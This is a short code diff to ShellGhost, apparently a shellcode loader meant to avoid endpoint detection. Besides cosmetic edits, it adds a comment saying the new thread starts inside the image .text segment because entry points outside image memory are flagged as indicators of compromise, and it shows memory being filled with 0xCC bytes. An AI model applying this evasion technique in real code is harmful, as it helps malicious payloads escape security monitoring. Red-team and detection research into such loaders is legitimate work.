@@ -3,7 +3,7 @@
 * Author: Angelo Frasca Caccia (lem0nSec_)
 * Date: 06/06/2023
 * Title: Shellghost.exe
-* website: https://github.com/lem0nSec/ShellGhost
+* Website: https://github.com/lem0nSec/ShellGhost
 *
 */
 
@@ -244,7 +244,6 @@ int main()
 {
 	HANDLE hThread = 0;
 
-
 	instruction[0].RVA = 0;
 	instruction[0].quota = 1;
 	instruction[1].RVA = 1;
@@ -451,6 +450,8 @@ int main()
 			*(BYTE*)((BYTE*)allocation_base + i) = 0xCC;
 		}
 
+		// The new thread entrypoint will be inside a IMG memory space (.text segment).
+		// This is because an entrypoint in an area other than IMG is often considered an IOC.
 		hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ResolveEndofTextSegment(), 0, 0, 0);
 		if (hThread != 0)
 		{
